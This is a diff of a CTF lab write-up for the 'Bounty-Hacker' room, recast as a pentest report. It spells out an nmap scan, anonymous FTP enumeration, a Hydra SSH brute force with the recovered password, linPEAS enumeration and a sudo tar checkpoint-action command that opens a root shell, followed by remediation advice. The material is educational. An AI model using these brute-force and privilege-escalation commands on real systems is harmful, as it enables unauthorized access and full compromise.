@@ -1,188 +1,162 @@
-# Bounty-Hacker -- CTF Writeup -- FTP Enumeration, SSH Brute Force, and Privilege Escalation via tar
+# Bounty-Hacker — CTF Writeup — FTP Enumeration, SSH Brute Force, and Privilege Escalation via tar
 
+## 1. Engagement Overview
+- **Title / Project Name:** Bounty-Hacker (CTF room)
+- **Author:** Myself
+- **Date:** old
+- **Objective:** Obtain user and root flags by enumerating FTP, brute-forcing SSH using an exposed wordlist, and abusing sudo/tar for privilege escalation.
+- **Scope / Target:** `10.10.169.105`
+- **Testing Window:** CTF box
+- **Tools Used:** nmap, ftp client, hydra, scp, nc, linPEAS, bash, GTFOBins reference
+- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup
 
+## 2. Short Summary
+Initial access was gained via anonymous FTP which contained a username hint and a wordlist (locks.txt). Used the wordlist with Hydra to brute-force SSH for user `lin` and obtained a user shell and `user.txt`. Running linPEAS revealed that `tar` could be invoked under sudo (or had SUID) and is abuseable; used the GTFOBins `tar` sudo technique to spawn a root shell and read `/root/root.txt`.
 
-> Short summary  
-> Gained initial access via anonymous FTP which contained a username hint and a wordlist. Performed a password guess (Hydra) against SSH for `lin`, obtained a user shell and `user.txt`. Ran linPEAS to enumerate privilege escalation vectors and discovered `tar` with SUID. Used a known GTFObins sudo `tar` abuse to spawn a root shell and read `root.txt`.
+## 3. Methodology / Process Flow
 
----
-
-## Target
-- IP: `10.10.169.105`
-- Scan date (local notes): 2025-09-12
-
----
-
-## 1 — Recon / Port scan
-
-Command:
-```bash
+### 3.1 Recon / Port scan
+**Commands**
+```
 nmap -sS 10.10.169.105
 ```
 
-Key output:
+**Key output (summary)**
+- `21/tcp` — ftp (open)
+- `22/tcp` — ssh (open)
+- `80/tcp` — http (open)
+
+### 3.2 FTP enumeration
+Connected as anonymous and listed available files.
+
+**Commands / actions**
 ```
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
-80/tcp open  http
-```
-
-Notes: FTP, SSH and HTTP were open. Proceeded to check FTP first since anonymous logins are often enabled on CTF boxes.
-
----
-
-## 2 — FTP enumeration
-
-Connected as anonymous:
-```
-ftp> open 10.10.169.105
-220 (vsFTPd 3.0.5)
-Name (10.10.169.105:root): anonymous
-230 Login successful.
-ftp> ls
--rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
--rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+ftp 10.10.169.105
+# login: anonymous
+ls
+# downloaded: locks.txt, task.txt
 ```
 
-Downloaded and viewed files.
+**Key findings**
+- `task.txt` contained a signed hint by `-lin` indicating `lin` is likely a user on the system.
+- `locks.txt` contained a list of candidate passwords used as the dictionary for password guessing.
 
-`task.txt`:
+### 3.3 SSH brute-force (password-guess)
+Used Hydra with `locks.txt` to attempt password guessing for user `lin` over SSH.
+
+**Command**
 ```
-1.) Protect Vicious.
-2.) Plan for Red Eye pickup on the moon.
-
--lin
-```
-- Observations: signed by `lin` — likely a username on the host.
-
-`locks.txt`:
-- Contained a list of words (used as a potential password list / dictionary).
-
-Conclusion: `lin` is a likely user. `locks.txt` looks like a suitable wordlist for password guessing.
-
----
-
-## 3 — SSH brute-force (password-guess)
-
-Used Hydra with the `locks.txt` dictionary:
-```bash
 hydra -l lin -P locks.txt ssh://10.10.169.105
 ```
 
-Hydra result:
+**Result**
+- Discovered password: `RedDr4gonSynd1cat3`
+- SSH login:
 ```
-[22][ssh] host: 10.10.169.105   login: lin   password: RedDr4gonSynd1cat3
-```
-
-Logged in via SSH:
-```bash
 ssh lin@10.10.169.105
-# cat ~/Desktop/user.txt
-THM{%flag removed%}
+cat ~/Desktop/user.txt
+# => user flag found
 ```
 
-Obtained `user.txt` — user-level compromise achieved.
+### 3.4 Privilege escalation enumeration
+Transferred and ran linPEAS for automated privilege escalation enumeration.
 
----
-
-## 4 — Privilege escalation enumeration
-
-Goal: escalate to root and read `/root/root.txt`.
-
-Transferred linPEAS and ran it:
-```bash
+**Commands**
+```
 scp linpeas.sh lin@10.10.169.105:/tmp/
-# on target
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
 ```
 
-Important linPEAS finding: `/bin/tar` is present and has SUID or is usable via `sudo` (linPEAS indicated a sudo rule or SUID bit relevant to `tar`).
+**Key findings**
+- linPEAS reported a SUID/sudo-relevant entry for `/bin/tar` (or that tar can be invoked via sudo), referencing potential abuse patterns listed on GTFOBins.
 
-Searched GTFObins for `tar` and found techniques allowing shell execution when `tar` is run with specific options / via sudo.
+### 3.5 Privilege escalation — abusing tar via sudo
+Used the GTFOBins sudo/tar technique to spawn a root shell:
 
----
-
-## 5 — Privilege escalation — abusing `tar` via sudo
-
-Observed that `tar` can be invoked through sudo. The following command was used to spawn a shell as root:
-
-```bash
+**Command**
+```
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-Explanation:
-- `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh` cause `tar` to run `/bin/sh` as the checkpoint action.
-- When run under `sudo` (and tar is allowed via sudo), this results in an interactive shell as root.
-
-After running the command:
+**Result**
 ```
-# whoami
-root
-```
-
----
-
-## 6 — Root flag
-
-With a root shell:
-```bash
+whoami
+# => root
 cat /root/root.txt
-THM{%Flag Removed%}
+# => root flag found
 ```
 
-Root flag obtained.
+### 3.6 Persistence / Cleanup
+- Removed transferred enumeration tools when finished:
+```
+rm /tmp/linpeas.sh
+```
+- Documented actions and artifacts for reporting.
 
----
+## 4. Findings Summary
+| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
+|----|------------------------|----------:|--------|----------------|
+| 1 | Anonymous FTP exposing hints and wordlists | Medium | Information leakage facilitating credential discovery | Disable anonymous FTP or restrict directories; do not store secrets in public shares |
+| 2 | Weak/guessable credentials discoverable via exposed wordlist | High | Account takeover via SSH | Enforce strong, unique passwords; rotate credentials; implement account lockout and MFA |
+| 3 | Sudoable/SUID `tar` binary allowing shell execution | Critical | Local privilege escalation to root | Remove sudo rights for tar or restrict allowed options; remove SUID where unnecessary; audit sudoers and SUID binaries regularly |
+| 4 | Lack of monitoring for suspicious use of utilities under sudo | Medium | Delayed detection of abuse | Implement auditing and alerting for unusual sudo usage and binary execution patterns |
 
-## 7 — Post-exploit notes & cleanup
-- On real systems, avoid leaving tools or credentials. For CTFs, be mindful of artifacts.
-- Files transferred (e.g., `linpeas.sh`) should be removed after use if appropriate:
-  ```bash
-  rm /tmp/linpeas.sh
-  ```
+## 5. Technical Details
 
----
+### Finding 1 — Anonymous FTP with exposed hints/wordlist
+- **Description:** Anonymous FTP allowed access to files including `task.txt` (hint signed by `lin`) and `locks.txt` (wordlist).
+- **Impact:** Information disclosure that facilitated targeted password guessing for SSH.
+- **Evidence (commands / outputs):**
+```
+ftp 10.10.169.105
+# ls shows locks.txt and task.txt
+cat task.txt
+# shows hint signed by -lin
+```
+- **Recommendation:** Disable or tightly restrict anonymous FTP. Never store credentials or password lists on public file shares.
 
-## 8 — Mitigation & recommendations
+### Finding 2 — SSH credential discovered via Hydra using locks.txt
+- **Description:** Used `locks.txt` to brute-force SSH credentials for `lin`.
+- **Impact:** Remote account compromise and user-level access.
+- **Evidence (commands / outputs):**
+```
+hydra -l lin -P locks.txt ssh://10.10.169.105
+# found password: RedDr4gonSynd1cat3
+ssh lin@10.10.169.105
+cat ~/Desktop/user.txt
+```
+- **Recommendation:** Enforce strong password policies, account lockouts, and MFA; remove exposed password lists.
 
-1. **Avoid password reuse / weak/default passwords**  
-   - The box used a guessable/weak password found in an exposed file. On production systems, never store passwords in plaintext files accessible via anonymous services. Enforce strong passwords and MFA where possible.
+### Finding 3 — Sudo/tar abuse for privilege escalation
+- **Description:** `tar` was available under sudo (or with SUID) and can execute arbitrary commands using `--checkpoint-action=exec` which allows spawning a shell.
+- **Impact:** Full root access and system compromise.
+- **Evidence (commands / outputs):**
+```
+# example exploit used:
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+whoami
+# root
+cat /root/root.txt
+```
+- **Recommendation:** Avoid allowing tar via sudo; remove SUID bits from interpreters/tools that can spawn shells; restrict sudo to specific safe commands and arguments.
 
-2. **Harden FTP / remove anonymous access**  
-   - Disable anonymous FTP or restrict the served directories. Use secure file transfer services (SFTP/FTPS) instead.
+## 6. Remediation Plan
+- **Critical:** Remove sudo rights for tar or revoke SUID bit on `/bin/tar` if present. Audit and remediate any binaries with SUID that are unnecessary.
+- **High:** Disable anonymous FTP or isolate it to strictly public content; remove sensitive files from FTP directories.
+- **High:** Enforce strong password policies and MFA; rotate any credentials discovered in incidents.
+- **Medium:** Implement monitoring/auditing for sudo usage and unusual binary executions; alert on suspicious activity.
+- **Low:** Regularly scan for exposed secrets and password lists in public shares or repositories.
 
-3. **Least privilege for sudo**  
-   - Review `/etc/sudoers` and sudoers.d to ensure users are not allowed to run arbitrary programs that can be abused to escalate privileges. Avoid allowing programs that accept arbitrary flags that can execute shell commands (or restrict them tightly).
-
-4. **SUID binaries auditing**  
-   - Remove unnecessary SUID/SGID bits from binaries. Audit all SUID binaries and validate their purpose. Use automated tools to check for known abuse patterns (e.g., GTFObins entries).
-
-5. **Detect improper command usage**  
-   - Monitor for suspicious use of utilities (`tar`, `less`, `vi`, `awk`, etc.) under sudo, and alert on unusual usages.
-
-6. **Secrets management**  
-   - Do not commit or expose secrets via services (FTP, web directories). Use secret managers for production credentials.
-
----
-
-## 9 — References
-- linPEAS — Privilege escalation auditing script (PEASS-ng).  
-- GTFObins — collection of Unix binaries that can be abused to escalate privileges: https://gtfobins.github.io/gtfobins/tar/#sudo
-
----
-
-## 10 — Appendix: commands used (extracted from notes)
-
-```bash
+## 7. Appendices
+**Tool outputs / commands used**
+```
 # Recon
 nmap -sS 10.10.169.105
 
 # FTP
 ftp 10.10.169.105
-# login: anonymous
-# download locks.txt, task.txt
+# download locks.txt, task.txt (anonymous)
 
 # SSH brute force
 hydra -l lin -P locks.txt ssh://10.10.169.105
@@ -193,14 +167,18 @@ cat ~/Desktop/user.txt
 
 # Transfer linPEAS
 scp linpeas.sh lin@10.10.169.105:/tmp/
-# on target
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
 
-# Privilege escalation (GTFObins technique)
+# Privilege escalation (GTFOBins tar)
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 # Root actions
 whoami
 cat /root/root.txt
+
+# Cleanup
+rm /tmp/linpeas.sh
 ```
+
+---
